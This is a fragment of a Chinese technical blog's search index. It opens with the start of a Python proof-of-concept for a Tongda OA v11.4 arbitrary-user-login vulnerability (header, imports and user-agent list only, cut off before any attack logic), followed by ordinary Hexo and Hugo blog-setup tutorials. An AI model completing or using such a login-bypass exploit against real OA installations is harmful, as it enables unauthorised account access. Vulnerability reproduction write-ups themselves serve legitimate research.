","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:6:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"附：POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64;","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:7:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"GitPages搭建 创建一个仓库 进入blog仓库，点击settings，一直拖到最下面，可以看到Github Pages，点击Select theme，选择一个主题后返回会可以看到站点已经被开通了 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"hexo本地配置 安装npm 后面需要npm包管理器来安装相关工具，进入下面地址进行下载 https://nodejs.org/en/ 查看npm版本，确保安装成功 node -v npm -version 安装hexo工具 首先要通过npm工具安装hexo工具 npm i hexo-cli -g 检验hexo是否安装成功 hexo -v 本地安装hexo 创建一个文件夹temp，进入文件夹执行下面的指令 hexo init 接下来安装hexo依赖 npm install 生成静态页面 hexo g 开启本地服务器 hexo s 进入http://localhost:4000/，就可以看到博客搭建好了 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:2:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"部署Hexo到Github Pages 1.克隆之前创建的Github Pages所在的仓库到本地 2.将本地部署文件夹temp下面所有文件拷贝到克隆的根目录下面 3.修改_config.yml文件 第一处修改url 第二处修改deploy，注意branch要填写main 4.安装插件，用于一键编译并部署到github npm install hexo-deployer-git --save 5.进行部署 hexo d 6.部署成功后就可以登录网站看下效果了 有时候浏览器有缓存，页面不会更新，可以清理缓存或者关闭Chrome缓存之后重新打开首页 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:3:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"绑定顶级域名 去godaddy网站上购买，支持支付宝，购买过程简单，就不多说了 github仓库绑定域名 可以通过直接在settings里面的custom domain里面设置，设置成功以后仓库会出现CNAME文件，不过这样设置的缺点是，每次hexo d指令执行以后，仓库的CNAME文件都会消失，导致顶级域名无法访问，需要在设置里面重新填入域名 我的方案是，在本地的source目录下创建一个CNAME文件，里面填上自己的顶级域名，比如我的是tutucoo.me，这样每次hexo d指令都会带上这个CNAME文件，就不再需要手动在settings里再进行设置啦 这一步做完要确保仓库的根目录生成一个CNAME文件 设置DNSPOD，接管DNS解析 进入我的产品 进入DNS管理 填入DNSPOD的nameservers，利用腾讯的DNS解析服务接管godaddy的dns解析，速度比godaddy快的多，另外这个服务使用简单、免费 那么这个nameserver的地址哪里获取呢？ 进入后台后，在DNS解析-我的域名处，添加一个域名，点击DNS错误右边的叹号就能看到DNS服务器地址了 godaddy中填入这两个地址后，就可以不用再在godaddy中进行任何设置了，之后的DNS解析的工作全部交给DNSPOD 添加一个域名，进行下图进行设置。 A记录填写的是185.199.108.153，Github Pages支持https，不过前提是需要将以下任意一个IP填写到DNS解析服务的A记录里 185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153 填写完之后保存，等待生效，之后就可以用顶级域名进行访问啦。 如果没有生效，可能是先在仓库中生成的CNAME，而填写A记录是在后面进行的，导致没有触发HTTPS，重新在项目仓库里的自定义域名处填入自己的顶级域名触发HTTPS就可以了（当然，就像前面说的，我们这里采取的方式是在sources文件夹下创建CNAME文件，之后hexo d生成的CNAME） ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:4:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"多终端同步hexo源码 在执行hexo d发布到github中的是编译后的文件，而源码是不会上传的，这就造成了，直接git clone下来的只有发布文件，没有源码，因此想在另一台电脑上编辑blog就无法进行，这里可以采用新建hexo分支的方式解决这个问题，hexo分支用来上传源码，main分支用来进行hexo d，这样在换一台电脑时，git clone下来的就是源码了，而hexo的配置文件里面指定的分支是main，所以hexo d指令执行之后会自动发布到main分支上，git push会推送到hexo分支上，通过这种方式就可以实现多终端编辑和发布blog了。 这是main分支的发布的文件，不是源码 首先在github仓库上创建一个分支，在输入框中输入hexo，创建一个叫hexo的分支，分支创建好之后，会把main分支里面的代码全部拷贝到hexo分支里面 接下来，进入仓库Settings，修改默认分支为hexo 创建好分支之后，git clone到本地，查看分支，hexo分支已经作为默认分支了 git branch 此时clone的文件夹里除了.git文件夹，其他的全部删除掉，然后把hexo源码文件夹里的文件拷贝到clone的文件夹中（除了.deploy_git、.git以及public文件夹） 将源码上传到hexo分支中 git status git add . git commit -m '' git push 此时跳转到hexo分支，可以看到刚推送上来的源码了，为了验证推送源码和发布网页不冲突，创建个新文章 hexo new test 然后发布到github hexo g hexo d 如果正常的话，此时新的文章就可以在首页上看到了，进入hexo分支，还是之前推送的源码，没有进行任何变动 因为发布了新的文章，源码也有了变动，继续将更改push到hexo分支，可以看到source文件夹中的文件成功推送了 通过这种方式实现了多终端同步 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:5:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"文章管理 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"创建文章 对于一般的文章直接使用下面的命令就可以在source/_posts文件夹下看到新建的文章了 hexo new 文章名 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:1","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"文章常用标记 打开新建的文章，可以看到文件头部有title，date几个标记，除了这几个，还有一些常用的 title: date: tags: description: categories: ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:2","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"图文混排 对于有图片的文章应该怎么插入图片呢？ 一般的做法是设置配置文件post_asset_folder: true，这样每次新建文章时都会创建一个markdown以及一个同名的文件夹，该文件夹下放入图片，就可以在文章中引用图片了，但是这种方式很奇葩，引用需要使用下面的语法 {% asset_img image.jpg xxx %} 可以使用hexo图片插件解决这个问题，使用正常的markdown语法引用图片 下载插件 npm install hexo-renderer-marked 安装成功后，在根目录下的_config.yml配置文件中进行修改 post_asset_folder: true marked: prependRoot: true postAsset: true 之后就可以使用标准的markdown语法引用图片了 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:3","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"主题 下载主题文件，放到根目录themes文件夹下，再到根目录下_config.yml文件中修改theme字段，名称跟主题文件夹名称保持一致 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:7:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"RSS订阅 为了方便习惯使用订阅软件的用户，还是有必要开通RSS订阅的，订阅的用户可以第一时间收到博文的更新 使用npm安装hexo rss插件 npm install hexo-generator-feed --save 根目录_config.yml文件添加一段代码 feed: enable: true type: atom path: atom.xml limit: 20 hub: content: content_limit: 140 content_limit_delim: ' ' order_by: -date icon: icon.png autodiscovery: true template: 然后hexo g重新生成就可以了进行订阅了 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:8:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"错误日志 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:0","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"npm速度太慢怎么办？ 添加一个国内源，使用npm下载工具的时候速度会快很多 npm config set registry https://registry.npm.taobao.org ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:1","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"WARN No layout index.html 进行hexo s时提示没有index.html，那是因为主题文件夹名称跟根目录配置文件中theme字段的主题名称不一致 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:2","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"hexo butterfly主题安装报错:extends includes/layout.pug 如果你没有pug以及stylus的渲染器，请下载安装：npm install hexo-renderer-jade hexo-renderer-stylus –save ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:3","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"hexo next主题目录无法跳转 目录使用了中文，使用英文就可以 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:4","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"换了next主题，报错 extends ‘_layout.swig’ 换了next主题，hexo s后进入首页报错： {% extends '_layout.swig' %} {% import '_macro/post.swig' as post_template %} {% import '_macro/sidebar.swig' as sidebar_template %} {% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %} {% block page_class %} {% if is_home() %}page-home{% endif -%} {% endblock %} {% block content %} {% for post in page.posts %} {{ post_template.render(post, true) }} {% endfor %} {% include '_partials/pagination.swig' %} {% endblock %} {% block sidebar %} {{ sidebar_template.render(false) }} {% endblock %} 原因是hexo在5.0之后把swig给删除了需要自己手动安装 npm i hexo-renderer-swig 然后hexo c清理缓存，hexo g \u0026 s 即可！ ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:5","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"执行npm install warn Failed to install dependencies 如果npm install过程中，提示npm ERR! code ETARGET，并且还有一串红字，可以尝试卸载npm，安装别的版本，重启电脑，就可以了 ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:6","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"报错Plugin load failed: %s hexo-theme-landscape 想换个主题，在theme文件夹下下载next主题，根目录下配置文件里面theme名称也改为next了，但执行hexo g生成时总是会报如下错误，虽然不会影响网站的正常运行，但看到Error总是不舒服，到blog根目录下，删除node_modules文件夹下的hexo-theme-landscape即可 INFO Validating config ERROR { err: [Error: EISDIR: illegal operation on a directory, read] { errno: -21, code: 'EISDIR', syscall: 'read' } } Plugin load failed: %s hexo-theme-landscape ","date":"2020-12-12","objectID":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:9:7","tags":null,"title":"使用Github Pages+Hexo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8github-pages-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"Hugo本地搭建 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:0","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"部署hugo工具 从官方下载的压缩包中，有一个hugo.exe工具，它用于hugo博客的一般操作 Windows下进行操作： 进入官方github页下载压缩包程序 https://github.com/gohugoio/hugo/releases 解压压缩包以后可以看到一个hugo.exe可执行程序，在环境变量中添加当前目录，使得可以在任意目录下执行hugo.exe命令 添加完环境变量，通过hugo version测试环境变量设置是否成功 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:1","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"新建博客站点 选择一个你想存放个人博客的本地目录，运行指令 hugo new site \"博客目录名称\" ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:2","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"生成 执行下面命令会生成public文件夹 hugo ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:3","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"本地服务开启 开启本地服务 hugo server 进入localhost:1313可以在本地预览博客 使用系统命令发表的文章默认都是草稿，打开生成的md文件会看到draft: true的标记，草稿是无法渲染的，如果要渲染包含草稿在内的所有文章需要运行下面指令 hugo server -D ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:4","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"设置主题 官方主题库地址：https://themes.gohugo.io/ 以pure主题为例：https://themes.gohugo.io/hugo-theme-pure/ 下载主题包后，解压后放到blog目录blog/themes目录下，并修改文件夹名为pure 进入blog\\themes\\even\\exampleSite目录，复制config.yml文件，要保证该文件内的theme字段的值跟blog/themes目录下的主题文件夹同名 推荐主题： https://github.com/dillonzq/LoveIt ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:5","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"发表第一篇文章 执行下面指令，会在blog/content/posts/目录下生成test.md文件 hugo new posts/test.md ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:1:6","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"GiteePages配置 新建仓库 项目名称和路径都要保持一致，全部填tutucoo（下图是搬的官方文档，没有改过来，见谅） 点击创建完成仓库的创建 添加文件 点击新建文件 文件名输入index.html，内容就是简单的html 点击提交，将文件提交到仓库 选择 pages 服务 选择需要部署的分支，这里选择 Master 启动服务。 访问生成的网站地址，即可以查看你部署的静态页面啦！ 